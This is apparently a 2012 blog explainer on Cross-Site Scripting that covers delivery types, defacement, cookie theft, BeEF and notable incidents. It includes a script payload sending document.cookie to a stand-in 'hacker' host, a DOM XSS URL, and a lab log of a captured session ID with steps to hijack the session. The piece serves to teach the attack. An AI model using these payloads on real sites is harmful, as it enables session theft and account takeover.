---
title: "XSS explained"
description: "The three ways to deliver a Cross-Site Scripting payload, the attack vectors that make it dangerous, and a short history of XSS in the wild."
date: 2012-10-06
tags: [xss, web, appsec]
---

Cross-Site Scripting is a class of web application vulnerability that involves injecting valid HTML or scripts into a page in some way.

XSS is very widespread (see the [OWASP Top 10](https://owasp.org/www-project-top-ten/)). It is both easy to eliminate and easy to detect, though usually harder to exploit than something like SQL injection. OWASP rates its impact as moderate, which I find very debatable. As Ed Skoudis has pointed out, this vulnerability can have catastrophic effects.

## Three ways to deliver a payload

### Non-persistent (reflected)

A non-persistent XSS is when you inject code and the server returns it to you unsanitized. It is often exploited by distributing an innocent-looking URL for others to click. The payload is not stored on the target, for example in a database. This is particularly effective in focused attacks: as long as you can get someone to click a URL carrying the payload, you have a shot at running code in their session.

### Persistent

If you can make the target store your payload, the attack becomes much more dangerous. A persistent payload is served back from the webserver itself, usually because it was stored in a database field, which makes it look legitimate. Consider a profile field that stores and later renders unsanitized input: anyone who views your profile runs the payload, trusting it came from the site. These are hard to spot and devastating. Imagine such a flaw in an auction site, where every visit to your listing places a bid.

### DOM-based

Similar to reflected, but the payload never has to be echoed back by the server. Often a value from a URL parameter is written into the page on the fly by JavaScript already running there:

```
http://victim/displayHelp.php?title=FAQ#<script>alert(document.cookie)</script>
```

Attackers encode the payload to make it look innocuous to the untrained eye (HTML entity encoding, for instance), which makes it much harder to tell apart from a harmless parameter.

## Two dangerous attack vectors

### Defacement

Defacement is not hard once you have an XSS, and if it is persistent it can be a real headache for admins to track down. A famous example was an XSS on Amazon.com, fittingly triggered through the preview of the book *XSS Attacks: Cross Site Scripting Exploits and Defense*, whose payloads ran against anyone viewing the listing.

### Cookie stealing and session hijacking

The classic. Once you can read a user's cookies you can grab sensitive data, and capturing a session ID can lead to session hijacking and elevated privileges. Consider a search field with no output sanitization. A crafted query can exfiltrate the cookie of anyone who clicks the link:

```
"><script>var img=new Image();img.src="http://hacker/a.gif?x="+document.cookie;</script>
```

At your webserver you receive requests revealing each victim's cookie in the `x` parameter. Even a `.gif` endpoint can be a script that logs the values. If an administrator clicks the link, you may capture their session ID and take over their account. It shows up in the logs like this, even as a 404:

```
192.168.20.174 - - [20/Aug/2012:09:20:45 +0200] "GET /a.gif?x=security%3Dlow%3B%20PHPSESSID%3D1sbhurqchkd2hk6m35gjg5oef4 HTTP/1.1" 404 503 "http://192.168.20.136/dvwa/vulnerabilities/xss_s/" "Mozilla/5.0"
```

The `PHPSESSID` value is the prize. Replacing your own cookie's session ID with the captured one usually lets you act as that user. Delivered via spam, forum posts, IM, or a social-engineering toolkit, this vector is dangerous.

## Exploiting XSS with BeEF

To see how far XSS can go, try [BeEF, the Browser Exploitation Framework](https://beefproject.com/). Run it on a webserver and hook a simulated victim (a "zombie") to experiment with payloads: steal cookies, grab page HTML, spawn fake dialogs, ask the user to re-authenticate, redirect them, keylog, deface, rewrite links, port-scan the internal network, and integrate with Metasploit including autopwn.

## Injecting XSS as a man in the middle

If you can become a man in the middle, you can inject valid HTML into the traffic passing through you. Ryan Linn and Steve Ocepek's Black Hat 2012 work showed this with a tool that downgrades encoding and injects a JavaScript payload into the HTML header. Combined with BeEF you can poison anyone using HTTP with hooks, persist the hooks across page changes, and build stealthier browser attacks.

## A short history of XSS

**The Samy worm (2005).** Samy Kamkar wrote a JavaScript worm that spread through an XSS flaw in MySpace. It installed itself on the profile of anyone who viewed an infected page and, within about 20 hours, had reached over a million users.

**Barack Obama's site redirected to Hillary Clinton (2008).** An attacker found an XSS on barackobama.com and redirected community-board visitors to hillaryclinton.com. Harmless in effect, but a clear demonstration that unfiltered `"` and `>` let arbitrary script run against every visitor.

**A fake CNN tornado warning.** A viral link pointed at CNN with a story about an incoming disaster. It was non-persistent XSS: the payload lived in a URL parameter, but because visitors landed on the real CNN and the story blended in, few realized it was fake. The knock-on effects of that kind of prank (panic, cancelled plans, emergency buying) are easy to imagine.
